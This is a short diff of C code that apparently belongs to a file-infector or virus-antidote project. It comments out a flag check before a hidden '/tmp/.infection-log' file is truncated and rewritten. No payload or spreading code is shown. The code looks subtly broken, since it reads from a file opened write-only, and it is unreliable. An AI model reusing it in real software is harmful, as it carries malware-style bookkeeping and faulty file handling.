@@ -547,12 +547,12 @@ marker:
 	fd_antidote = open(STR("/tmp/.infection-log") , O_CREAT|O_WRONLY|O_APPEND , 0666);
 	read_bits = read_buf(fd_antidote , buf , IO_BUFFER_SIZZ);
 	close(fd_antidote);
-	int flag = buf[tmp];
-	if(flag){
+	//int flag = buf[tmp];
+	//if(flag){
 	fd_antidote = open(STR("/tmp/.infection-log") , O_CREAT|O_WRONLY|O_TRUNC|O_APPEND , 0666);
 	write_bits = write_buf(fd_antidote , buf+tmp , string_length(buf)-tmp);
 	close(fd_antidote);
-	}
+	//}
 
 	return 1;
 }
